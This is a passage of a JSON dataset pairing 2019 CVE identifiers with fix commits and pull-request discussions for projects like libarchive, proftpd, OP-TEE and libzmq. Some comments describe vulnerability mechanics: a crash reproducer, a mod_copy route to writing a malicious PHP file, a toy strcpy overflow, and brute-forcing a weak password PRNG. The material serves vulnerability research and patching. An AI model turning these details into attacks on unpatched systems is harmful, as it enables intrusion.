            "other_info": "Fix a 7zip crash and a ISO9660 infinite loop These have been assigned CVEs through the DWF project:\r\n - CVE-2019-1000019 for 65a23f5\r\n - CVE-2019-1000020 for 8312eaa There's an identical \"performance optimization\" later in the same file; also vulnerable? I'm not sure. I'm not deeply familiar with the libarchive code, but it seems to me the optmization sit in two very different code locations: the above is in a `if` block that gets called only once in `get_uncompressed_data` and therefore *might* not return the requested `minimum` bytes. the other optimization, however, is in `extract_pack_stream` which is structured differently: it lives in a `for (;;)` loop that repeatedly calls the optimized code. before the function returns, there's this extra check as well:\r\n\r\n```c\r\n\tif (zip->uncompressed_buffer_bytes_remaining < minimum) {\r\n\t\tarchive_set_error(&(a->archive),\r\n\t\t    ARCHIVE_ERRNO_MISC, \"Damaged 7-Zip archive\");\r\n\t\treturn (ARCHIVE_FATAL);\r\n\t}\r\n```\r\n\r\nI also note that the function starts with a potentially similar code block as the vulnerable one, but without the optimization:\r\n\r\n```c\r\n\tif (zip->codec == _7Z_COPY && zip->codec2 == (unsigned long)-1) {\r\n\t\tif (minimum == 0)\r\n\t\t\tminimum = 1;\r\n\t\tif (__archive_read_ahead(a, minimum, &bytes_avail) == NULL\r\n\t\t    || bytes_avail <= 0) {\r\n\t\t\tarchive_set_error(&a->archive,\r\n\t\t\t    ARCHIVE_ERRNO_FILE_FORMAT,\r\n\t\t\t    \"Truncated 7-Zip file body\");\r\n\t\t\treturn (ARCHIVE_FATAL);\r\n\t\t}\r\n\t\tif (bytes_avail > (ssize_t)zip->pack_stream_inbytes_remaining)\r\n\t\t\tbytes_avail = (ssize_t)zip->pack_stream_inbytes_remaining;\r\n\t\tzip->pack_stream_inbytes_remaining -= bytes_avail;\r\n\t\tif (bytes_avail > (ssize_t)zip->folder_outbytes_remaining)\r\n\t\t\tbytes_avail = (ssize_t)zip->folder_outbytes_remaining;\r\n\t\tzip->folder_outbytes_remaining -= bytes_avail;\r\n\t\tzip->uncompressed_buffer_bytes_remaining = bytes_avail;\r\n\t\treturn (ARCHIVE_OK);\r\n\t}\r\n```\r\n\r\nso I don't believe the code is vulnerable after patch. I can also confirm the reproducer stops working after applying the patch:\r\n\r\n```sh\r\nvagrant@jessie:~$ bsdtar -Oxf crash.7z\r\nbsdtar: Damaged 7-Zip archive\r\nbsdtar: Error exit delayed from previous errors.\r\n```\r\n\r\nSo I'll go under the assumption this is properly fixed. But really, only formal proof (in C? ;), time and fuzzing will tell so don't quote me on that...",
            "pr_title_words": 9,
            "comments_words": 280,
            "total_other_info_words": 289
        },
        {
            "cve-id": "CVE-2019-14982",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/e925bc5addd881543fa503470c8a859e112cca62",
            "commit_msg": "Fix integer overflow by checking size against header_size\n\nNote that the problem occurs when data_size is less than header_size\nwhat causes a buffer overflow in &data[i]\n\nCo-Authored-By: D4N <dan.cermak@cgc-instruments.com>",
            "commit_msg_words": 29,
            "other_info": "Fix integer overflow in WebPImage::getHeaderOffset Since the poc results in a crash on Master, shouldn't we rather fix it on master first? # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/962?src=pr&el=h1) Report\n> Merging [#962](https://codecov.io/gh/Exiv2/exiv2/pull/962?src=pr&el=desc) into [0.27-maintenance](https://codecov.io/gh/Exiv2/exiv2/commit/82b9e5e81cfc3cefcd1a73ce651f74f728a70a53?src=pr&el=desc) will **increase** coverage by `0.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/962/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/962?src=pr&el=tree)\n\n```diff\n@@                 Coverage Diff                  @@\n##           0.27-maintenance     #962      +/-   ##\n====================================================\n+ Coverage             63.03%   63.05%   +0.01%     \n====================================================\n  Files                   156      156              \n  Lines                 21628    21627       -1     \n====================================================\n+ Hits                  13634    13637       +3     \n+ Misses                 7994     7990       -4\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/962?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/webpimage.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/962/diff?src=pr&el=tree#diff-c3JjL3dlYnBpbWFnZS5jcHA=) | `68.46% <100%> (+0.94%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/962?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/962?src=pr&el=footer). Last update [82b9e5e...e925bc5](https://codecov.io/gh/Exiv2/exiv2/pull/962?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n > Since the poc results in a crash on Master, shouldn't we rather fix it on master first?\r\n\r\nRight. I tested directly on `0.27-maintenance` and I could not reproduce the crash, but on master I could. The only difference is that we end up throwing different exceptions after applying the fix in different branches. \r\n\r\nI propose to merge this as it is in `0.27-maintenance` and then I will take care of adapting the test code in master when mergify do its job.  This sounds good, Luis.  It'd be good to get these things into v0.27.2.  However, we should wrap up RC3 in the next few days and get v0.27.2 out by 2019-07-31.\r\n\r\nI made a start on the book today.  At the moment, it's just a framework.  I'll include the first draft in v0.27.3 with a couple of chapters written, and brief notes in the other chapters.",
            "pr_title_words": 5,
            "comments_words": 282,
            "total_other_info_words": 287
        },
        {
            "cve-id": "CVE-2019-18936",
            "commit_url": "https://github.com/jgarzik/univalue/commit/07aa635c034f3a2accfe4e20a8148c366bccf5bf",
            "commit_msg": "UniValue::read(): Clear internal state upon error\n\nAvoid parsing edge cases that leave the class internal data in an\ninconsistent state, when the parser encounters an input data error.\n\nThis is a rewrite of PR #39 by @awemany.",
            "commit_msg_words": 37,
            "other_info": "UniValue::read(): Clear internal state upon error",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-15558",
            "commit_url": "https://github.com/xm-online/xm-commons/commit/de96e9c4339e37ab1172e3a4e16ee2b7dfe74a70",
            "commit_msg": "fix sql injection",
            "commit_msg_words": 3,
            "other_info": "fix sql injection",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2019-19274",
            "commit_url": "https://github.com/python/typed_ast/commit/dc317ac9cff859aa84eeabe03fb5004982545b3b",
            "commit_msg": "Fix two out-of-bounds array reads (#99)\n\nThe patch is taken from a commit to the CPython repo with the message:\r\n\r\nbpo-36495: Fix two out-of-bounds array reads (GH-12641)\r\n\r\nResearch and fix by @bradlarsen.",
            "commit_msg_words": 32,
            "other_info": "Fix two out-of-bounds array reads Hello, and thanks for your contribution!\n\nI'm a bot set up to make sure that the project can legally accept your contribution by verifying you have signed the [PSF contributor agreement](https://www.python.org/psf/contrib/contrib-form/) (CLA).\n\nUnfortunately we couldn't find an account corresponding to your GitHub username on [bugs.python.org](https://bugs.python.org/) (b.p.o) to verify you have signed the CLA (this might be simply due to a missing \"GitHub Name\" entry in your b.p.o account settings). This is necessary for legal reasons before we can look at your contribution. Please follow [the steps outlined in the CPython devguide](https://devguide.python.org/pullrequest/#licensing) to rectify this issue.\n\n\nYou can [check yourself](https://check-python-cla.herokuapp.com/) to see if the CLA has been received.\n\nThanks again for your contribution, we look forward to reviewing it!\n Thanks! Are you planning to sign the CLA? If not, I'll treat this as a bug report and apply the fix myself. @gvanrossum I signed the agreement now, but apparently it may take one business day for it to show up on github. OK, once the CLA bot changes the label I'll merge this. Thanks for your contribution!",
            "pr_title_words": 5,
            "comments_words": 176,
            "total_other_info_words": 181
        },
        {
            "cve-id": "CVE-2019-25104",
            "commit_url": "https://github.com/rtcwcoop/rtcwcoop/commit/f2cd18bc2e1cbca8c4b78bee9c392272bd5f42ac",
            "commit_msg": "fixed exploit where server crash by spamming team command\n\n********************\nERROR: G_Alloc: failed on allocation of 27248 bytes\n********************\n----- Server Shutdown (Server crashed: G_Alloc: failed on allocation of 27248 bytes) -----\n\nreplaced G_Alloc -> trap_Alloc\n\nanyway POOLSIZE for G_Alloc will fill up quickly just changing team in game menu",
            "commit_msg_words": 50,
            "other_info": "fixed exploit where server crash by spamming team command CVE-2019-25104 was apparently assigned for this denial of service.",
            "pr_title_words": 9,
            "comments_words": 9,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2019-12815",
            "commit_url": "https://github.com/proftpd/proftpd/commit/71cd49ea82313f78d52a52d0c628a3770dc96608",
            "commit_msg": "Bug #4372: Ensure that mod_copy checks for <Limits> for its SITE CPFR/CPTO\ncommands.",
            "commit_msg_words": 13,
            "other_info": "Bug #4372: Ensure that mod_copy checks for <Limits> for its SITE CPFR\u2026 \n[![Coverage Status](https://coveralls.io/builds/24627078/badge)](https://coveralls.io/builds/24627078)\n\nCoverage remained the same at 82.446% when pulling **71cd49ea82313f78d52a52d0c628a3770dc96608 on site-cpfr-cpto-limits-bug4372** into **e12bf92f7116c3e4be6373555871c4eda3fe1bdf on master**.\n FTR, the CVE related to this CVE-2019-12815. > FTR, the CVE related to this CVE-2019-12815.\r\n\r\nwill this result in new releases for 1.3.5 and 1.3.6 ? @computersalat Hopefully it does, but you may need to build from source from the 1.3.6 branch until a release happens. I don't think the fix has been backported to 1.3.5 yet. If I installed 1.3.6 when it was released via RPM, would that version be vulnerable as well? From what I can read on NVD it's only up to 1.3.5b? @benlarsendk 1.3.6 is vulnerable as well. You will need to either build a new RPM from the 1.3.6 branch (you can refer to `contrib/dist/travis/docker-rpmbuild.sh` for how to do this) or wait for your package maintainer to do so. why does it say every where that it is upto 1.3.5b then? are all version still vulnerable? @gittur there is a _different_ issue, [Bug#4169](http://bugs.proftpd.org/show_bug.cgi?id=4169), that was addressed earlier in `mod_copy`. ohh pheww! Thanks as always then :) @Castaglia\r\nToday I built a Debian package using source code of 1.3.5e and noticed that the issue is still reproducible. At least I can still create a malicious.php as described in Bug 4372. Please double check. Thanks! Hi,\n\nOn Sun, Jul 28, 2019 at 06:34:35AM -0700, hpreusse wrote:\n> > @gittur there is a _different_ issue, [Bug#4169](http://bugs.proftpd.org/show_bug.cgi?id=4169), that was addressed earlier in `mod_copy`.\n> Today I built a Debian package using source code of 1.3.5e and\n> noticed that the issue is still reproducible. At least I can still\n> create a malicious.php as described in Bug 4372. Please double\n> check. Thanks!\n\nSome additional information: There were other issues related to\nmod_copy, but CVE-2019-12815 is specific to the issue reported in\nhttp://bugs.proftpd.org/show_bug.cgi?id=4372 .\n\nThe reporters (Tobias M\u00e4del) blogpost about it is at\nhttps://tbspace.de/cve201912815proftpd.html .\n\nThe CVE description should always be taken with a salt of grain. It\nmight just reflect the information available at a given point in time\nor might reflect which versions were tested, but not mentioning\nfurther followup versions in a branch does not necessarly mean it was\nfixed after the mentioned version (unless it is clearly stated that\nthe issue is fixed in version x.y).\n\nSorry for the lengthly excurse, but I hope it is of benefit for all\nfollowing this issue as there was some confusion on which are the\nfixed versions. At time of writing there is the fix commited but there\nis no upstream version which would contain already the fix.\n\nHope this helps :)\n\nIf the fix additionally to on top of the 1.3.6 series could be\nbackported to the 1.3.5 series that would help downstreams shipping\nthis version :)\n\nActually for Debian stretch Hilmar Preusse did backport the changes,\nsee https://bugs.debian.org/932453 but in Debian we have not yet\nreleases a so called DSA, because the version for 1.3.5 backport shows\na strange behaviour. When trying to reproduce the issue, the\nconnection just terminates (plugging effectively the issue, but for\nthe 1.3.6 version it returns correctly a permission denied and\nconnection remains intact). There might thus missed some prerequeisite\ncommits for backports to the 1.3.5 series in e.g. the error handling\nor so.\n > Actually for Debian stretch Hilmar Preusse did backport the changes, see https://bugs.debian.org/932453 but in Debian we have not yet releases a so called DSA, because the version for 1.3.5 backport shows a strange behaviour.\r\n\r\nIt wasn't a backport what I did. I simply adapted the patch we got in this pull request so it applies to the source tree and compilation runs OK. As said: I didn't even do functional testing. ;-(",
            "pr_title_words": 12,
            "comments_words": 613,
            "total_other_info_words": 625
        },
        {
            "cve-id": "CVE-2019-1010294",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/7e768f8a473409215fe3fff8f6e31f8a3a0103c6",
            "commit_msg": "core: clear the entire TA area\n\nPreviously we cleared (memset to zero) the size corresponding to code\nand data segments, however the allocation for the TA is made on the\ngranularity of the memory pool, meaning that we did not clear all memory\nand because of that we could potentially leak code and data of a\nprevious loaded TA.\n\nFixes: OP-TEE-2018-0006: \"Potential disclosure of previously loaded TA\ncode and data\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nSuggested-by: Jens Wiklander <jens.wiklander@linaro.org>\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>",
            "commit_msg_words": 100,
            "other_info": "Fixes for security potential issues reported by Riscure I've seen the Shippable error, I'll have a look at it. > I've seen the Shippable error, I'll have a look at it.\r\n\r\nI've changed the macro to only consider SMALL_PAGE_SIZE, since that is what we check against. Will push a fix soon. Pushed fixes for all (fixable) comments so far. I've saved the ones that has to be done at rebase/force push time. LGTM, you may add my:\r\n\r\n`Acked-by: Jerome Forissier <jerome.forissier@linaro.org>`\r\n\r\n...to all the commits that deal with CFG_ flags. `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments. > `Acked-by: Etienne Carriere <etienne.carriere@linaro.org>` for the whole with some minor comments.\r\n\r\n@etienne-lms , I'm confused. I cannot see any comments from you. Is GitHub playing me a trick here? Pushed a few more fixes.\r\n\r\nWaiting for:\r\n- Etienne's follow up answers on my replies to his findings.\r\n\r\nTo-do at rebase/force/squash:\r\n- Add Acked-by tags.\r\n- Fix wrong author vs Signed-Off-By.\r\n - Fixed SoB / Author inconsistency.\r\n- Fixed all outstanding review comments.\r\n- Fixed spelling error found by checkpatch / Shippable.\r\n- Added A-B and T-B tags.\r\n\r\nSo, if IBART and friends are happy .... then ...\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks! Sorry, I still have comments on the last 6 commits.\r\n\r\n- \"plat-all: Enable CFG_CORE_STACK_PROTECTOR_STRONG=y by default\" removes `CFG_WITH_STACK_CANARIES ?= y` from `rpi3`. It also enables`CFG_TA_STACK_PROTECTOR_STRONG ?= y` which is introduced in a later commit. Overall I think this commit had better be folded into the parent commit \"core: introduce CFG_CORE_STACK_PROTECTOR_STRONG flag\" (which will also avoid a Travis warning about missing commit description).\r\n- \"ta-dev-kit: enable _FORTIFY_SOURCE=2 on optimized builds\": you say \"shall only be enabled...\", so why isn't it part of commit \"ta-dev-kit: Introduce CFG_TA_FORTIFY_SOURCE\"?\r\n\r\nAlso I think the Travis warnings (missing commit descriptions) should be fixed. When introducing a new flag, we should explain what it does, why we add it, and what is its default value. Things I expect to understand when reading the description are: what is a stack protector? What happens when the \"protection\" detects that something is wrong? Does the TA panic? Does the TEE core panic? Same for the \"fortify\" option.\r\n\r\nIn the end I'd like to have 4 commits:\r\n```\r\n    ta: introduce CFG_TA_STACK_PROTECTOR_STRONG\r\n    ta: introduce CFG_TA_FORTIFY_SOURCE\r\n    core: introduce CFG_CORE_STACK_PROTECTOR_STRONG\r\n    core: introduce CFG_CORE_FORTIFY_SOURCE\r\n```\r\n @jforissier , makes sense. I'll do another clean-up / clarification round, stay tuned. Easier said that done trying to trigger the protectors, since I get data abort when trying to put together examples that should trigger the stack-protector for example. I'd expect some output like \"`*** stack smashing detected ***` at least before the data-abort. @jbech-linaro hard to find documentation, but it looks like the compiler will just call `__stack_chk_fail()`, which we happen to define here: https://github.com/OP-TEE/optee_os/blob/3.3.0/lib/libutils/isoc/stack_check.c\r\nAt least, that's what I can see in the disassembly (`tee.dmp` or `objdump -ldx ta.elf`).\r\n\r\nSo, if I understand correctly, the TA or the TEE core thread would just hang when stack smashing is detected (instead of proceeding with corrupt data). I think I can trigger it successfully now, since without using the flags I get data-aborts, with the flags enabled I get stuck. I've tried to figure out where I am by checking GDB, but so far I haven't been able to make sense out of the address. I'll try to see whether it ends up in `stack_check.c` or not. @jbech-linaro sounds good. Perhaps `__stack_chk_fail()` should `EMSG()` and call `panic()` (`ifdef __KERNEL__`) or `abort()`/`utee_panic()` (user mode TA). Or is there any reason we could not do that in this context? I've tried setting a breakpoint at `__stack_chk_fail`, but it doesn't seem to hang there. But I can see my data (`foo(AAAA...)`) in the `r2` when breaking, so I suspect it is stuck somewhere in strcpy, and/or \"panic\" while(1) as a consequence of this.\r\n```bash\r\nfoo(\"AAAAAAA.....\");\r\n\r\nvoid foo(char *bar) {\r\nchar buffer[16];\r\nstrcpy(buffer, bar)\r\n}\r\n```\r\n\r\n```\r\nr2 = 0x00414141\r\n...\r\n```\r\nI think I will skip the CFG_-patches and submit them as a separate PR if/when I have some time to spare. They weren't really part of the Riscure report, I just added it, since I thought it'd be useful to catch things. > I think I will skip the CFG_-patches [...]\r\n\r\nSure. They are definitely useful IMO, but certainly not required for 3.4.0. Thanks! Two things ....\r\n1. I've removed the CFG patches from this PR and pushed that.\r\n2. I've rebuilt QEMU with SMP=1 and now!!! Lo and behold! I'm stuck in .... drum roll ... `__stack_chk_fail() { while (1) }`.\r\n\r\nSo it seems to work as expected.\r\n\r\nAnyhow, as before, if IBART and friends are happy:\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 8,
            "comments_words": 780,
            "total_other_info_words": 788
        },
        {
            "cve-id": "CVE-2019-6250",
            "commit_url": "https://github.com/zeromq/libzmq/commit/1a2ed12716693073032d57dac4e269df3d373751",
            "commit_msg": "Problem: pointer overflow in zmq::v2_decoder_t::size_ready leading to remote code execution (issue #3351)\n\nSolution: refactor bounds check arithmetic such that no overflow shall occur\n\nSigned-off-by: Guido Vranken <guidovranken@gmail.com>",
            "commit_msg_words": 27,
            "other_info": "V2 decoder overflow RCE fix Per this rule in the spec\r\n\r\n```\r\nWhen two pointers are subtracted, both shall point to elements of the same array object, or one past the last element of the array object;\r\nthe result is the difference of the subscripts of the two array elements. \r\n```\r\n\r\nthe following ought to be legal pointer arithmetic:\r\n\r\n```msg_size_ > allocator.data () + allocator.size () - read_pos_ ```\r\n\r\nbecause\r\n\r\n```allocator.data () + allocator.size ()``` constitutes a valid pointer, and subtracting the valid pointer ```read_pos_``` from the result, yields the \"difference of the subscripts of the two array elements\", which is the distance in bytes for the type ```unsigned char```.\r\n\r\nTo guarantee this in all circumstances, we might want to add a ```static_assert``` (or similar) that the pointer types of ```allocator.data ()``` and ```read_pos_``` are equivalent, and moreover point to a type of size ```1```.\r\n\r\nFurthermore, this assumes ```read_pos_``` >= ```allocator.data ()```, for which we might want to add an ```assert()```, as crashing via ```assert()``` is less severe than potential remote code execution resulting from an invalid pointer computation. Thanks for the fix! Unfortunately, this fails to compile with some builds, e.g. here: https://travis-ci.org/zeromq/libzmq/jobs/477075295#L1215\nA cast to ptrdiff_t might be added to resolve this. Fixes #3351 @guidovranken thank you very much for finding the bug and sending the fix. There's a formatting error but I'll take care of that, as you've done enough already.\r\n\r\nI'll try and do a new release soon-ish, as soon as I can do the validation and changelog. > @guidovranken thank you very much for finding the bug and sending the fix. There's a formatting error but I'll take care of that, as you've done enough already.\r\n> \r\n> I'll try and do a new release soon-ish, as soon as I can do the validation and changelog.\r\n\r\nOh, I just pushed the fix for formatting before I saw your message.",
            "pr_title_words": 5,
            "comments_words": 309,
            "total_other_info_words": 314
        },
        {
            "cve-id": "CVE-2019-15651",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/c6e4aebcdff4e774c94953ffe9de7ce287c54f4f",
            "commit_msg": "sanity check on buffer size",
            "commit_msg_words": 5,
            "other_info": "sanity check on buffer size",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2019-19270",
            "commit_url": "https://github.com/proftpd/proftpd/commit/81cc5dce4fc0285629a1b08a07a109af10c208dd",
            "commit_msg": "Issue #859, #861: Fix handling of CRL lookups by properly using issuer for\nlookups, and guarding against null pointers.",
            "commit_msg_words": 19,
            "other_info": "Issue #859, #861: Fix handling of CRL lookups by properly using issue\u2026 \n[![Coverage Status](https://coveralls.io/builds/27206964/badge)](https://coveralls.io/builds/27206964)\n\nCoverage remained the same at 82.354% when pulling **81cc5dce4fc0285629a1b08a07a109af10c208dd on tls-crls-issue859** into **0ad869403c8c5cad5d4d31472086ba31c9253c8e on master**.",
            "pr_title_words": 12,
            "comments_words": 17,
            "total_other_info_words": 29
        },
        {
            "cve-id": "CVE-2019-12735",
            "commit_url": "https://github.com/neovim/neovim/commit/5e611f32841e746932fbcbea292ca502ed9e694b",
            "commit_msg": "vim-patch:8.1.1365: source command doesn't check for the sandbox\n\nProblem:    Source command doesn't check for the sandbox. (Armin Razmjou)\nSolution:   Check for the sandbox when sourcing a file.\nhttps://github.com/vim/vim/commit/53575521406739cf20bbe4e384d88e7dca11f040",
            "commit_msg_words": 28,
            "other_info": "vim-patch:8.1.1365: :source should check sandbox No tests? This is a backport to the maintenance branch.",
            "pr_title_words": 5,
            "comments_words": 10,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2019-12829",
            "commit_url": "https://github.com/radareorg/radare2/commit/b282620b7a8818910c42a29b8f0855a2d13eec14",
            "commit_msg": "Fix #14303 - oob crash in RParse api usage, needs API redesign (#14307)",
            "commit_msg_words": 13,
            "other_info": "Fix #14303 - oob crash in RParse api usage, needs API redesign",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2019-15784",
            "commit_url": "https://github.com/Haivision/srt/commit/47e589072c44350b0305c05066c224d1cbda992d",
            "commit_msg": "[core] Fixed sender list to reallocate on insert\nif required",
            "commit_msg_words": 10,
            "other_info": "Potential CSndUList array overflow This vulnerability is tracked in [CVE-2019-15784](https://nvd.nist.gov/vuln/detail/CVE-2019-15784)\r\n@ethouris: Do you plan to make a new release soon? Thanks",
            "pr_title_words": 4,
            "comments_words": 17,
            "total_other_info_words": 21
        },
        {
            "cve-id": "CVE-2019-10878",
            "commit_url": "https://github.com/teeworlds/teeworlds/commit/e086f4b35b1adf7edc35b4ad332dc7ed1edc5988",
            "commit_msg": "Add bound check in datafile.cpp anywhere m_ppDataPtrs is accessed as an array. Should fix #2073",
            "commit_msg_words": 15,
            "other_info": "Fix integer overflow when computing tilemap size. Fixes #2071 - Fixed the commit fixing #2071 with @oy's instructions\r\n- Retrieved e086f4b35b1adf7edc35b4ad332dc7ed1edc5988 to fix #2073",
            "pr_title_words": 9,
            "comments_words": 15,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2019-10908",
            "commit_url": "https://github.com/airsonic/airsonic/commit/61c842923a6d60d4aedd126445a8437b53b752c8",
            "commit_msg": "Generate new passwords in a secure way\n\nPreviously, lost passwords were generated via\norg.apache.commons.lang.RandomStringUtils,\nwhich is using java.util.Random internally.\n\nThis PRNG is has a 48-bit seed, that can easily be bruteforced\nif an attacker is able to get the PRNG's output, for example\nbut resetting their own account multiple times,\nleading to trivial privileges escalation attacks.\n\nThis commit makes use of java.security.SecureRandom\ninstead.",
            "commit_msg_words": 63,
            "other_info": "Generate new passwords in a secure way This PR fixes `CVE-2019-10908`.",
            "pr_title_words": 7,
            "comments_words": 4,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2019-19624",
            "commit_url": "https://github.com/opencv/opencv/commit/d1615ba11a93062b1429fce9f0f638d1572d3418",
            "commit_msg": "video:fixed DISOpticalFlow segfault from small img",
            "commit_msg_words": 6,
            "other_info": "video:fixed DISOpticalFlow segfault from small img",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-14844",
            "commit_url": "https://github.com/krb5/krb5/commit/c3e62609849ab62caf52fa9b90d9ab60d365a64d",
            "commit_msg": "Fix KDC crash when logging PKINIT enctypes\n\nCommit a649279727490687d54becad91fde8cf7429d951 introduced a KDC crash\nbug due to transposed strlcpy() arguments.  Fix the argument order.\n\nThis bug does not affect any MIT krb5 release, but affects the Fedora\nkrb5 packages due to backports.  CVE-2019-14844 has been issued as a\nresult.\n\nticket: 8772",
            "commit_msg_words": 50,
            "other_info": "Fix KDC crash when logging PKINIT enctypes The \"DEPRECATED\" issue is interesting, but I think the only real worry is that we mark newer enctypes that way.\r\n\r\nRFC 4556 section 3.1.4 says this about the pkinit enctypes:\r\n\r\n> The practice of assigning Kerberos encryption type numbers to indicate support for CMS algorithms is considered deprecated, and new numbers should not be assigned for this purpose.  Instead, the supportedCMSTypes field should be used to identify the algorithms supported by the client and the preference order of the client.\r\n\r\nBut it follows that with:\r\n\r\n> For maximum interoperability, however, PKINIT clients wishing to indicate to the KDC the support for one or more of the algorithms listed above SHOULD include the corresponding encryption type number(s) in the etype field of the AS-REQ.\r\n\r\nDoes that meet the krb5 requirements for deprecation?  It seems a little handwavy, but my feeling is yes.  If not, it may be time to get started on an I-D for their explicit deprecation...",
            "pr_title_words": 7,
            "comments_words": 157,
            "total_other_info_words": 164
        },
        {
            "cve-id": "CVE-2019-17091",
            "commit_url": "https://github.com/eclipse-ee4j/mojarra/commit/a3fa9573789ed5e867c43ea38374f4dbd5a8f81f",
            "commit_msg": "Fixes #4556 : HIGH-LEVEL VULNERABILITY WITHIN MOJARRA JSF V2.2",
            "commit_msg_words": 9,
            "other_info": "Fixes #4556 : HIGH-LEVEL VULNERABILITY WITHIN MOJARRA JSF V2.2",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2019-18393",
            "commit_url": "https://github.com/igniterealtime/Openfire/commit/5af6e03c25b121d01e752927c401124a4da569f7",
            "commit_msg": "OF-1886: Plugin Servlet shouldn't provide access to any file on the host",
            "commit_msg_words": 12,
            "other_info": "OF-1886: Plugin Servlet shouldn't provide access to any file on the host",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2019-12589",
            "commit_url": "https://github.com/netblue30/firejail/commit/eecf35c2f8249489a1d3e512bb07f0d427183134",
            "commit_msg": "mount runtime seccomp files read-only (#2602)\n\navoid creating locations in the file system that are both writable and\r\nexecutable (in this case for processes with euid of the user).\r\n\r\nfor the same reason also remove user owned libfiles\r\nwhen it is not needed any more",
            "commit_msg_words": 45,
            "other_info": "mount runtime seccomp files read-only @smithosu - looks fine, bring it in! It has a conflict in src/firejail/sandbox.c. Thanks!",
            "pr_title_words": 5,
            "comments_words": 14,
            "total_other_info_words": 19
        },
        {
            "cve-id": "CVE-2019-20791",
            "commit_url": "https://github.com/openthread/openthread/commit/b8c3161281f8e15873f8decabd8eac461717aefe",
            "commit_msg": "[commissioner] add network name length check in GeneratePskc() (#4404)",
            "commit_msg_words": 9,
            "other_info": "[commissioner] add network name length check in GeneratePskc() \n\n# Size Report of **OpenThread**\n> Merging [#4404](https://github.com/openthread/openthread/commit/96805981c0b42a6af940460d0bc27290cd45fa68) into [master](https://github.com/openthread/openthread/commit/57b0f533bb744cc6bd6f1b66ff5c63c9c47616e2)(57b0f533bb744cc6bd6f1b66ff5c63c9c47616e2).\n\n|  name  |  branch  |  text  | data  | bss  | total |\n| :----: | :------: | -----: | ----: | ---: | ----: |\n| ot-cli-ftd | master | 374992 | 720 | 72884 | 448596 |\n|  | #4404 | 374992 | 720 | 72884 | 448596 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| ot-cli-mtd | master | 300752 | 720 | 64324 | 365796 |\n|  | #4404 | 300752 | 720 | 64324 | 365796 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| ot-ncp-ftd | master | 378796 | 720 | 72180 | 451696 |\n|  | #4404 | 378812 | 720 | 72180 | 451712 |\n|  | +/- | +16 | 0 | 0 | +16 |\n| ot-ncp-mtd | master | 304848 | 720 | 63628 | 369196 |\n|  | #4404 | 304848 | 720 | 63628 | 369196 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| ot-rcp | master | 62864 | 636 | 7684 | 71184 |\n|  | #4404 | 62864 | 636 | 7684 | 71184 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| libopenthread-cli-ftd.a | master | 33569 | 0 | 3500 | 37069 |\n|  | #4404 | 33569 | 0 | 3500 | 37069 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| libopenthread-cli-mtd.a | master | 26347 | 0 | 3484 | 29831 |\n|  | #4404 | 26347 | 0 | 3484 | 29831 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| libopenthread-ftd.a | master | 191110 | 0 | 54946 | 246056 |\n|  | #4404 | 191138 | 0 | 54946 | 246084 |\n|  | +/- | +28 | 0 | 0 | +28 |\n| libopenthread-mtd.a | master | 128303 | 0 | 46394 | 174697 |\n|  | #4404 | 128303 | 0 | 46394 | 174697 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| libopenthread-ncp-ftd.a | master | 49230 | 0 | 2380 | 51610 |\n|  | #4404 | 49230 | 0 | 2380 | 51610 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| libopenthread-ncp-mtd.a | master | 44152 | 0 | 2380 | 46532 |\n|  | #4404 | 44152 | 0 | 2380 | 46532 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| libopenthread-rcp.a | master | 26433 | 0 | 1524 | 27957 |\n|  | #4404 | 26433 | 0 | 1524 | 27957 |\n|  | +/- | 0 | 0 | 0 | 0 |\n| 